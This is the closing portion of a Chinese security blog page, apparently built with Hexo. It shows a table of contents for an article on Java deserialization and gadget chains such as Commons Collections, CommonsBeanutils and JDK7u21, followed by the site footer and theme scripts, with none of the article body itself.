		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80"><span class="nav-text">反序列化基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8A%9F%E8%83%BD%E7%89%B9%E5%BE%81"><span class="nav-text">反序列化功能特征</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%8B%E7%BC%A9%E7%89%B9%E5%BE%81%EF%BC%88%E5%8E%8B%E7%BC%A9%E5%90%8E%E4%B8%80%E4%BA%9B%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E6%94%B9%E5%8F%98%EF%BC%89"><span class="nav-text">压缩特征（压缩后一些数据格式改变）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E7%89%B9%E5%BE%81-%E6%95%B0%E6%8D%AE%E5%86%85%E5%AE%B9-%E8%AF%B7%E6%B1%82%E7%B1%BB%E5%9E%8B"><span class="nav-text">反序列化数据特征(数据内容+请求类型)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%A1%E4%BB%B6"><span class="nav-text">序列化条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%8E%A5%E5%8F%A3"><span class="nav-text">序列化接口</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95"><span class="nav-text">序列化基本用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">自定义序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-text">序列化数据结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A1%B6%E5%B1%82%E7%BB%93%E6%9E%84"><span class="nav-text">顶层结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E7%A0%81"><span class="nav-text">类型码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E7%B1%BB%E5%9E%8B%EF%BC%9ATC-OBJECT"><span class="nav-text">对象类型：TC_OBJECT</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88Class-Descriptor%EF%BC%89"><span class="nav-text">类描述符（Class Descriptor）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E7%B1%BB%EF%BC%9ATC-CLASSDESC"><span class="nav-text">普通类：TC_CLASSDESC</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%A3%E7%90%86%E7%B1%BB%EF%BC%9ATC-PROXYCLASSDESC"><span class="nav-text">代理类：TC_PROXYCLASSDESC</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#classdata%EF%BC%88%E5%AF%B9%E8%B1%A1%E5%AE%9E%E4%BE%8B%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="nav-text">classdata（对象实例数据）</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-text">序列化过程分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ObjectOutputStream-%E5%AF%B9%E8%B1%A1"><span class="nav-text">ObjectOutputStream 对象</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9D%97%E8%BE%93%E5%87%BA%E6%B5%81%EF%BC%9ABlockDataOutputStream-bout"><span class="nav-text">块输出流：BlockDataOutputStream bout</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E5%8F%A5%E6%9F%84%E8%A1%A8%EF%BC%9AHandleTable-handles"><span class="nav-text">对象句柄表：HandleTable handles</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E6%9B%BF%E6%8D%A2%E8%A1%A8%EF%BC%9AReplaceTable-subs"><span class="nav-text">对象替换表：ReplaceTable subs</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ObjectOutputStream-%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="nav-text">ObjectOutputStream 构造函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A0%E5%8F%82%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="nav-text">无参构造函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%89%E5%8F%82%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="nav-text">有参构造函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#writeObject-%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">writeObject 序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#writeObject0"><span class="nav-text">writeObject0</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#writeOrdinaryObject"><span class="nav-text">writeOrdinaryObject</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#writeClassDesc"><span class="nav-text">writeClassDesc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#writeExternalData"><span class="nav-text">writeExternalData</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#writeSerialData"><span class="nav-text">writeSerialData</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-text">反序列化过程分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ObjectInputStream-%E5%AF%B9%E8%B1%A1"><span class="nav-text">ObjectInputStream 对象</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9D%97%E8%BE%93%E5%85%A5%E6%B5%81%EF%BC%9ABlockDataInputStream"><span class="nav-text">块输入流：BlockDataInputStream</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E5%8F%A5%E6%9F%84%E8%A1%A8%EF%BC%9AHandleTable"><span class="nav-text">对象句柄表：HandleTable</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E5%9B%BE%E6%A0%A1%E9%AA%8C%E5%9B%9E%E8%B0%83%EF%BC%9AValidationList"><span class="nav-text">对象图校验回调：ValidationList</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ObjectInputStream-%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="nav-text">ObjectInputStream 构造函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#readObject-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">readObject 反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#readObject0"><span class="nav-text">readObject0</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#readOrdinaryObject"><span class="nav-text">readOrdinaryObject</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#readClassDesc"><span class="nav-text">readClassDesc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#readExternalData"><span class="nav-text">readExternalData</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#readSerialData"><span class="nav-text">readSerialData</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%EF%BC%88URLDNS-%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="nav-text">反序列化利用（URLDNS 为例）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-text">利用链分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CommonCollections-%E7%B3%BB%E5%88%97"><span class="nav-text">CommonCollections 系列</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Commons-Collections-%E6%A6%82%E8%BF%B0"><span class="nav-text">Commons Collections 概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Transformer"><span class="nav-text">Transformer</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8-transform-%E6%96%B9%E6%B3%95%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="nav-text">调用 transform 方法的对象</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#TransformedMap"><span class="nav-text">TransformedMap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LazyMap"><span class="nav-text">LazyMap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TransformingComparator"><span class="nav-text">TransformingComparator</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Transformer-%E7%9A%84%E6%8E%A5%E5%8F%A3%E5%AE%9E%E7%8E%B0%E7%B1%BB"><span class="nav-text">Transformer 的接口实现类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ConstantTransformer"><span class="nav-text">ConstantTransformer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#InvokerTransformer"><span class="nav-text">InvokerTransformer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#InstantiateTransformer"><span class="nav-text">InstantiateTransformer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ChainedTransformer"><span class="nav-text">ChainedTransformer</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Transformer-%E6%9E%84%E9%80%A0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="nav-text">Transformer 构造代码执行流</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">构造任意代码执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E4%BB%BB%E6%84%8F%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A0%E8%BD%BD"><span class="nav-text">构造任意字节码加载</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">相关利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CommonsCollections0%EF%BC%88AnnotationInvocationHandler%E2%86%92TransformedMap%EF%BC%89"><span class="nav-text">CommonsCollections0（AnnotationInvocationHandler→TransformedMap）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CommonsCollections1%EF%BC%88AnnotationInvocationHandler%E2%86%92LazyMap%EF%BC%89"><span class="nav-text">CommonsCollections1（AnnotationInvocationHandler→LazyMap）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CommonsCollections2%EF%BC%88PriorityQueue%E2%86%92TransformingComparator%EF%BC%89"><span class="nav-text">CommonsCollections2（PriorityQueue→TransformingComparator）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CommonsCollections3%EF%BC%88%E2%80%A6%E2%86%92TrAXFilter%E2%86%92InstantiateTransformer%EF%BC%89"><span class="nav-text">CommonsCollections3（…→TrAXFilter→InstantiateTransformer）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CommonsCollections4%EF%BC%88CC2-TrAXFilter%EF%BC%89"><span class="nav-text">CommonsCollections4（CC2+TrAXFilter）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CommonsCollections5%EF%BC%88BadAttributeValueExpException%E2%86%92TiedMapEntry%EF%BC%89"><span class="nav-text">CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CommonsCollections6%EF%BC%88HashMap%E2%86%92TiedMapEntry%E2%86%92LazyMap%EF%BC%89"><span class="nav-text">CommonsCollections6（HashMap→TiedMapEntry→LazyMap）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CommonsCollections7%EF%BC%88Hashtable%E2%86%92LazyMap%EF%BC%89"><span class="nav-text">CommonsCollections7（Hashtable→LazyMap）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%83%85%E5%86%B5"><span class="nav-text">修复情况</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CommonsBeanutils"><span class="nav-text">CommonsBeanutils</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CommonsBeanutils-%E6%A6%82%E8%BF%B0"><span class="nav-text">CommonsBeanutils 概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CommonsBeanutils1"><span class="nav-text">CommonsBeanutils1</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">原生反序列化利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JDK7u21"><span class="nav-text">JDK7u21</span></a></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        51 posts in total
                    </span>
                    
                        <span>
                            949.7k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>